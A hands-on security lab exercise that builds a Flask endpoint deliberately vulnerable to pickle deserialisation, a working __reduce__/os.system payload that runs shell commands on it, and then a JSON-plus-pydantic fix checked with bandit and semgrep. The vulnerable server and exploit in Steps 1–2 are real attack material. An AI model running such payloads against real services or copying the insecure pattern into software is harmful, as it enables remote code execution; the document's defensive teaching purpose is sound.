# Exercise 1 — Pickle RCE: Build It, Break It, Patch It

**Estimated time:** 60 minutes. Python 3.11, Flask, pydantic. Local only.

```
┌─────────────────────────────────────────────────────────────────────┐
│  AUTHORIZED USE ONLY                                                │
│                                                                     │
│  Bind to 127.0.0.1. Run the vulnerable code on your own machine.    │
│  Do not deploy any of this code to a public service. Do not run     │
│  the pickle payload against any service you do not operate.         │
└─────────────────────────────────────────────────────────────────────┘
```

## Scenario

You are auditing a small "cart import/export" feature in a Python web app. The feature accepts a serialised cart blob, deserialises it, and replays the cart into the session. The original developer used `pickle` because "it's faster than JSON." Your job is to demonstrate the vulnerability, then write the fix.

This exercise covers:

- **`pickle` deserialisation of untrusted data** — CWE-502.
- The fix shape: JSON + `pydantic` schema validation.
- The `bandit` rule (`B301`) that catches the bug.
- The `semgrep` rule (`python.lang.security.deserialization.avoid-pickle`) that catches the bug.

Cited CVEs as receipts of the same shape in production:

- **CVE-2019-6446** — `numpy.load` default `allow_pickle=True`.
- **CVE-2022-29216** — TensorFlow Keras Lambda layer RCE via `load_model`.
- **CVE-2024-3568** — `transformers` `trust_remote_code` pickle RCE.

---

## Step 1 — Build the vulnerable server (10 min)

Create `pickle_bad.py`:

```python
# pickle_bad.py
# AUTHORIZED USE ONLY — local lab on 127.0.0.1.
import pickle
from flask import Flask, request, jsonify, abort

app = Flask(__name__)

# In a real app this would be in a session or a DB.
_carts: dict[str, dict] = {}

@app.route("/cart/import", methods=["POST"])
def cart_import():
    """Import a pickled cart. VULNERABLE — A08 / CWE-502."""
    if not request.data:
        abort(400, "no body")
    # The bug:
    cart = pickle.loads(request.data)   # <-- pickle.loads on untrusted input.
    _carts["current"] = cart
    return jsonify({"ok": True, "cart": str(cart)})

@app.route("/cart")
def cart_get():
    return jsonify(_carts.get("current", {}))

if __name__ == "__main__":
    # 127.0.0.1 only. Do not bind 0.0.0.0.
    app.run(host="127.0.0.1", port=5001)
```

Run it in one terminal:

```bash
python pickle_bad.py
# * Running on http://127.0.0.1:5001
```

A legitimate request looks like:

```python
# legit_client.py
import pickle, requests
cart = {"user_id": 1, "items": ["coffee", "pen"], "total_cents": 1250}
r = requests.post("http://127.0.0.1:5001/cart/import", data=pickle.dumps(cart))
print(r.json())
```

```bash
python legit_client.py
# {'cart': "{'user_id': 1, 'items': ['coffee', 'pen'], 'total_cents': 1250}", 'ok': True}
```

So far the API works. Now break it.

---

## Step 2 — Build the RCE payload (10 min)

Create `make_payload.py`:

```python
# make_payload.py
# AUTHORIZED USE ONLY — pops /tmp/pwned-by-pickle on YOUR OWN machine.
import os
import pickle
import sys

class RCE:
    """
    On unpickle, Python's pickle module reconstructs the object by literally
    calling whatever __reduce__ returns. We return (os.system, ('touch ...',))
    so the receiver runs the shell command of our choice.
    """
    def __reduce__(self):
        return (os.system, ("touch /tmp/pwned-by-pickle && echo PWNED",))

if __name__ == "__main__":
    payload = pickle.dumps(RCE())
    sys.stdout.buffer.write(payload)
```

Generate and send the payload:

```bash
# In a second terminal:
python make_payload.py > payload.pkl

# Confirm the file does not exist yet:
ls /tmp/pwned-by-pickle 2>/dev/null && echo "exists" || echo "does NOT exist"

# Send the payload to the vulnerable endpoint:
curl -X POST --data-binary @payload.pkl http://127.0.0.1:5001/cart/import

# Now the file exists:
ls -l /tmp/pwned-by-pickle
```

You should see the file `/tmp/pwned-by-pickle` was created **by the Flask process**, with that user's permissions. The server's terminal will also print `PWNED` (because `os.system` ran).

If you change the payload to `os.system("id > /tmp/whoami-from-pickle")`, you can read the running uid:

```bash
cat /tmp/whoami-from-pickle
```

That is your proof of arbitrary code execution. Stop the vulnerable server (Ctrl-C). Delete the marker files (`rm /tmp/pwned-by-pickle /tmp/whoami-from-pickle`).

---

## Step 3 — Write the patched server (15 min)

The fix is to replace `pickle` with JSON + pydantic schema validation. Create `pickle_good.py`:

```python
# pickle_good.py
# Replaces pickle with JSON + pydantic. CWE-502 closed.
import json
from flask import Flask, request, jsonify, abort
from pydantic import BaseModel, Field, ValidationError, conlist

app = Flask(__name__)
_carts: dict[str, "Cart"] = {}

MAX_BODY = 64 * 1024   # 64 KB — cart import should not exceed this.

class Cart(BaseModel):
    """The schema. Anything not matching is rejected."""
    user_id: int = Field(ge=1, le=2**31 - 1)
    items: list[str] = Field(default_factory=list, max_length=100)
    total_cents: int = Field(ge=0, le=2**31 - 1)

@app.route("/cart/import", methods=["POST"])
def cart_import():
    """Import a cart as JSON. Schema-validated."""
    raw = request.get_data(cache=False)
    if not raw or len(raw) > MAX_BODY:
        abort(400, "bad size")
    try:
        data = json.loads(raw)
    except json.JSONDecodeError:
        abort(400, "bad json")
    try:
        cart = Cart.model_validate(data)
    except ValidationError as e:
        return jsonify({"ok": False, "errors": e.errors()}), 400
    _carts["current"] = cart
    return jsonify({"ok": True, "cart": cart.model_dump()})

@app.route("/cart")
def cart_get():
    cart = _carts.get("current")
    return jsonify(cart.model_dump() if cart else {})

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5001)
```

Run it:

```bash
python pickle_good.py
```

Legitimate request:

```bash
curl -X POST -H "Content-Type: application/json" \
     -d '{"user_id": 1, "items": ["coffee", "pen"], "total_cents": 1250}' \
     http://127.0.0.1:5001/cart/import
# {"ok": true, "cart": {"user_id": 1, "items": ["coffee", "pen"], "total_cents": 1250}}
```

The attack now:

```bash
curl -X POST --data-binary @payload.pkl http://127.0.0.1:5001/cart/import
# {"ok": false, "errors": [...]} or 400 bad json — pickle bytes are not JSON.

# Confirm /tmp/pwned-by-pickle is NOT created:
ls /tmp/pwned-by-pickle 2>/dev/null && echo "exists (BAD)" || echo "does NOT exist (GOOD)"
```

The patched server rejects the payload at the JSON-parsing step. Even if the attacker sends valid JSON that happens to encode a pickle-equivalent abstract structure, pydantic refuses anything that does not match `Cart`. There is no path from the byte stream to a callable invocation.

---

## Step 4 — Confirm the scanners catch it (10 min)

Run `bandit` against `pickle_bad.py`:

```bash
bandit pickle_bad.py
```

You should see at least:

```
>> Issue: [B301:blacklist] Pickle and modules that wrap it can be unsafe when used to
   deserialize untrusted data, possible security issue.
   Severity: Medium   Confidence: High
   CWE: CWE-502
   File: pickle_bad.py:14
```

Run `semgrep`:

```bash
semgrep --config p/python pickle_bad.py
```

You should see:

```
python.lang.security.deserialization.avoid-pickle.avoid-pickle
   Avoid using `pickle`, which is known to lead to code execution vulnerabilities.
   ...
```

Run both against `pickle_good.py` — neither tool should report any finding (or, at worst, `bandit B404`/`B403` *informational* notes if you imported `pickle` elsewhere, which you did not in `pickle_good.py`).

---

## Step 5 — Write the writeup (15 min)

Create `writeup.md` (200-400 words). Cover:

1. **Hazard class and CWE.** `pickle` deserialisation of untrusted data; CWE-502; OWASP A08:2021 (Software and Data Integrity Failures).
2. **The bug, one sentence anchored to the line.** Quote `pickle_bad.py:14` (`cart = pickle.loads(request.data)`) and state that the byte stream chooses the callable via `__reduce__`.
3. **The fix, one sentence anchored to the line.** Quote `pickle_good.py:24-32` and state that JSON has no callable-reference grammar and pydantic enforces the schema.
4. **Defender-side detection.** Cite `bandit B301`, `semgrep p/python avoid-pickle`, CodeQL `py/unsafe-deserialization`, and which severity each produces by default.
5. **Residual risk.** Schema validation does not address DoS via a 50 MB JSON body or schema-conforming-but-business-logic-violating data. The `MAX_BODY` cap addresses the first; business-logic validation (e.g., does `user_id` belong to the current session?) addresses the second and is *not* in the schema.

CVEs to cite as receipts: **CVE-2019-6446**, **CVE-2022-29216**, **CVE-2024-3568**.

---

## Acceptance

- `pickle_bad.py`, `make_payload.py`, `pickle_good.py`, `writeup.md` all present.
- The PoC creates `/tmp/pwned-by-pickle` against `pickle_bad.py`; the same PoC fails (no file) against `pickle_good.py`.
- `bandit` flags `pickle_bad.py:14` as `B301` Medium/High; `bandit` reports zero findings against `pickle_good.py` (ignoring informational import-only rules).
- `semgrep --config p/python` flags `pickle_bad.py`; reports zero findings against `pickle_good.py`.
- The writeup is 200-400 words and explicitly cites at least one CVE and the relevant CWE ID.

---

## Stretch

If you finish early:

- Replace `pickle` with `msgpack` + HMAC + schema validation instead of JSON. Compare the wire size and parse time against JSON.
- Read `numpy.load`'s documentation. Construct a `.npy` file that, when loaded with `allow_pickle=True`, executes the same PoC. Demonstrate that `allow_pickle=False` (the default since NumPy 1.16.3 / **CVE-2019-6446**) rejects it.
- Write a `semgrep` custom rule that catches *every* pickle entry point in your project: `pickle.load`, `pickle.loads`, `dill.load`, `shelve.open`. Test it against a tiny corpus.
